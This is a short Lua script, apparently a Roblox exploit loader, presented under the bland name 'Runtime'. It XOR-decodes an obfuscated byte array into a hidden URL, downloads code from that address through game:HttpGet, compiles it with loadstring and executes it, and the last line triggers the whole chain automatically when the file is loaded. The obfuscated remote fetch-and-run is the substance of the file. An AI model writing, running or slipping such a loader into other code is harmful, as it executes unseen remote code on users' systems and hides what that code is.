local Runtime = {}

local Vault = {
    Payload = {
        59, 60, 78, 74, 33, 111, 97, 123,
        42, 41, 43, 20, 86, 71, 87, 35,
        58, 85, 78, 55, 54, 58, 122, 45,
        40, 51, 21, 79, 29, 14, 54, 113,
        12, 94, 99, 122, 20, 23, 36, 122,
        115, 125, 108, 124, 64, 10, 5, 125,
        80, 6, 59, 9
    },

    Key = "SH::RUNTIME::26"
}

local function transform(a, b)
    local result, factor = 0, 1

    while a > 0 or b > 0 do
        local x = a % 2
        local y = b % 2

        if x ~= y then
            result = result + factor
        end

        a = math.floor(a / 2)
        b = math.floor(b / 2)
        factor = factor * 2
    end

    return result
end

function Runtime.Resolve()
    local output = {}

    for index, value in ipairs(Vault.Payload) do
        local keyIndex = ((index - 1) % #Vault.Key) + 1
        local keyByte = string.byte(Vault.Key, keyIndex)

        output[index] = string.char(
            transform(value, keyByte)
        )
    end

    return table.concat(output)
end

function Runtime.Transport(address)
    local service = game
    local getter = service["HttpGet"]

    assert(type(getter) == "function", "HTTP unavailable")

    local success, response = pcall(function()
        return getter(service, address)
    end)

    assert(success, "Request failed: " .. tostring(response))
    assert(type(response) == "string" and #response > 0, "Empty response")

    return response
end

function Runtime.Execute(source)
    local compiler = loadstring or load

    assert(type(compiler) == "function", "Compiler unavailable")

    local executable, reason = compiler(source)

    assert(type(executable) == "function", "Compilation failed: " .. tostring(reason))

    return executable()
end

function Runtime.Initialize()
    local endpoint = Runtime.Resolve()
    local source = Runtime.Transport(endpoint)

    return Runtime.Execute(source)
end

return Runtime.Initialize()
